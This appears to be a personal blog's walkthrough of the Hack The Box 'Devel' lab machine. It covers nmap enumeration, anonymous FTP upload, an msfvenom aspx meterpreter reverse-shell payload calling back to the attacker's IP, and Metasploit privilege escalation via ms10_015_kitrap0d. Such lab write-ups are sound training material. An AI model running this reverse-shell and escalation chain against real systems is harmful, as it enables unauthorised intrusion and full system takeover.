@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="utf-8">
+  <link rel="icon" href="../images/favicon.png">
+  <title>Hack The Box: Devel Walkthrough</title>
+  <meta name="description" content="Technical Walkthrough of Hack The Box's Devel machine. Rated as an easy machine.">
+  <meta name="keywords" content="VillaRoot, Villa root, Windows, Hacking, PenTesting, Hack The Box, htb, walkthrough, cybersecurity, offensive, devel, easy, metasploit">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- google font -->
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Lato&family=Playfair+Display:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+
+  <!-- CSS stylesheet -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+  <link rel="stylesheet" href="../css/article-styles.css">
+
+  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+
+</head>
+
+<body>
+
+  <section id="top">
+    <div class="container-fluid">
+
+      <!-- Navbar -->
+      <nav class="navbar navbar-expand-md">
+        <a class="navbar-brand" href="../index.html">Villa~Root</a>
+        <button class="navbar-toggler navbar-dark" type="button" data-toggle="collapse" data-target="#navbarToggler">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarToggler">
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-items">
+              <a class="nav-link" href="../windows.html">Windows</a>
+            </li>
+            <li class="nav-items">
+              <a class="nav-link" href="../linux.html">Linux</a>
+            </li>
+            <li class="nav-items">
+              <a class="nav-link" href="../cybersecurity.html">CyberSecurity</a>
+            </li>
+            <li class="nav-items">
+              <a class="nav-link" href="../aboutme.html">About Me</a>
+            </li>
+          </ul>
+        </div>
+
+      </nav>
+    </div>
+  </section>
+
+  <section id="main">
+
+    <!-- jumbotron -->
+    <div class="jumbotron jumbotron-fluid ">
+      <div class="d-flex flex-wrap justify-content-center align-items-center title-container">
+
+        <div class=" image-container ">
+          <img class="jumbo-image" src="../images/Main-CS.jpg" alt="ImageForTitle">
+        </div>
+        <div class="title-container ">
+          <h1 class="jumbo-header">Hack The Box: Devel Walkthrough</h1>
+        </div>
+
+      </div>
+    </div>
+
+
+    <!-- body content -->
+    <div class="all-body">
+      <div class="outer-container shadow-lg p-3 mb-5 rounded">
+        <h4>Go To:</h4>
+        <a href="#Summary">Summary</a><br>
+        <a href="#Enumeration">Enumeration</a><br>
+        <a href="#Exploitation">Exploitation</a><br><br>
+        <h4 id="Summary">Summary:</h4>
+        <p>
+          Technical Walkthrough of Hack the Box's Devel machine. Devel is a Windows
+          machine, rated as an easy machine. It’s been about 8 months since I was
+          active on Hack the Box, so I wanted to get back into the groove with a
+          pretty easy machine. The enumeration and exploitation process was quick
+          and simple. I’d recommend this machine for beginners.
+        </p>
+        <!-- Enumeration -->
+        <h4 id="Enumeration">Enumeration:</h4>
+        <p>
+          Starting off the information gathering with a typical nmap scan of the common ports.
+          The results show that port 80 (http), and 21 (ftp) are open. The nice thing about ftp results
+          on nmap is that it will also show if ‘Anonymous’ login is allowed. This means you don’t
+          need to know log in credentials and use username ‘Anonymous’ and leave the password
+          field blank (just press enter) when prompted. It even lists the files in the folder
+          we will have access to. The files listed look like ones left over from other people
+          using the box.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/nmap-1.png" alt="nmap-image"><br><br>
+        <p>
+          To ftp use ‘ftp &lt;ip address&gt;’ and enter your creds. Since we know
+          that ‘Anonymous’ is accepted then I’ll use that as my username and press
+          enter when prompted for passwords. To list the files in the directory that
+          you are in enter ‘dir’. Here we can see that there are a lot of files that
+          seem to be from other users, the ‘iisstart.html’ that is the welcome page,
+          along with ‘welcome.png’. I doubt there is any steganography on this welcome
+          png, but in other more difficult boxes that would be something to look into.
+
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/ftp-1.png" alt="ftp-image"><br><br>
+        <p>
+          I have a file on my machine to use when I want to test if I can tranfer
+          files to a machine. It's a text file name 'text.txt' with random words inside.
+          The tranfer was successful by entering 'put text.txt', so I know I can try putting
+          a executable to get a reverse shell.
+        </p>
+
+        <!-- exploation -->
+        <h4 id="Exploitation">Exploitation:</h4>
+        <p>
+          I’ll be using msfvenom to create the payload, and metasploit to set up the
+          listener to get my reverse shell. So I will be using the payload
+          ‘windows/meterpreter/reverse_tcp’ then set the local host ‘LHOST’
+          to your machine and the listening port ‘LPORT’ to the port you want
+          to listen on. Note: you can find your IP with 'ifconfig' and it's listed
+          under tun0. The port can pretty much be any one that isn’t a common
+          port. I used '5555' since it’s easy to remember, and I'll name the file 'jv-devel.aspx'.
+        </p>
+        <pre><code>
+    msfvenom -p /windows/meterpreter/reverse_tcp -f aspx -o jv-devel.aspx LHOST=10.10.14.30 LPORT=5555
+        </code></pre>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/create-payload.png" alt="ftp-image"><br><br>
+
+        <p>
+          With the payload created, we can now put it on the target machine through ftp.
+          To transfer the file enter 'put &lt;your file name&gt;' in my case 'put jv-devel.aspx'.
+          Then 'dir' to make sure it's listed.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/put-payload.png" alt="ftp-image"><br><br>
+        <p>
+          Now it’s time to set up the listener on metasploit, enter ‘msfconsole’ in a
+          command prompt. The exploit for these msfvenom shells is ‘exploit/multi/handler’.
+          Here we set the options to match the options when we created the payload with
+          msfvenom. Set payload to ‘windows/meterpreter/reverse_tcp’, set lhost to your
+          attacking machine, and the port to the you chose. Once completed, double check
+          the setting with ‘show options’.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/set-listener.png" alt="ftp-image"><br><br>
+
+        <p>
+          To execute either enter ‘run’ or ‘exploit’, but I prefer to use
+          ‘exploit’ since it feels cooler to type out.<br>
+          Take note that it says it created a session '1' as this info will be use later on.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/first-exploit-run.png" alt="ftp-image"><br><br>
+
+        <p>
+          I got a shell on my first try, but these boxes are being used
+          constantly so if you don’t get a shell right away try 2-3 more times.<br>
+          Enter 'shell' to get a working shell prompt.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/first-exploit-shell.png" alt="ftp-image"><br><br>
+        <p>
+          Nothing too useful in the folders, the User folders of Babis and Administrators
+          get access denied. Right away I got the systeminfo for the machine, and ran it
+          through Windows
+          Exploit Suggester. However, it didn’t lead me to one I could use, and I ended
+          up just using metasploit for the privilege escalation. I’ll still provide the
+          images for it below.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/sysinfo.png" alt="ftp-image"><br><br>
+        <img class ="article-image"
+            src="../images/CS-Images/Devel/Win-Exploit-sug.png" alt="ftp-image"><br><br>
+        <p>
+          Exiting the shell and changing to '/multi/recon/local_exploit_suggester'
+          I list the possible exploits. With a couple trial and errors I find
+          the right exploit of '/exploit/windows/local/ms10_015_kitrap0d'. 'show options'
+          to see what needs to be set. Looks like just the session. As noted eariler
+          session 1 was being used for inital exploit, so we just need to enter 'set session 1'.
+          Then execute with 'exploit' or 'run'.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/set-system-exploit.png" alt="ftp-image"><br><br>
+          <img class ="article-image"
+            src="../images/CS-Images/Devel/set-exploit-2.png" alt="ftp-image"><br><br>
+        <p>
+          Sweet, we got our Meterpreter session back.
+          Enter ‘shell’ to go to a shell, then check what account we are in with ‘whoami’.
+          Now the fireworks can be set off as we see that we are now ‘System’ and can access
+          the Babis and Administrator folder.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/system-access.png" alt="ftp-image"><br><br>
+        <p>
+          To get the root and user flags, change directories 'cd' to get the 'Users' folders
+          then check the 'Desktop'
+          folders for 'Babis' and 'Administrator'. <br>Since this is a Windows machine, to
+          print out the contents of a text file enter 'type &lt;file name&gt;'.
+        </p>
+        <img class ="article-image"
+          src="../images/CS-Images/Devel/user-txt.png" alt="ftp-image"><br><br>
+          <img class ="article-image"
+            src="../images/CS-Images/Devel/root-txt.png" alt="ftp-image"><br><br>
+          <p>
+            Thanks for reading this Walkthrough for the Devel machine!
+          </p>
+
+      </div>
+    </div>
+
+
+
+  </section>
+
+  <!-- footer -->
+  <footer class="foot" id="footer">
+    <div class="footer-text">
+      <p>© Copyright 2021 VillaRoot</p>
+    </div>
+  </footer>
+</body>
+
+</html>
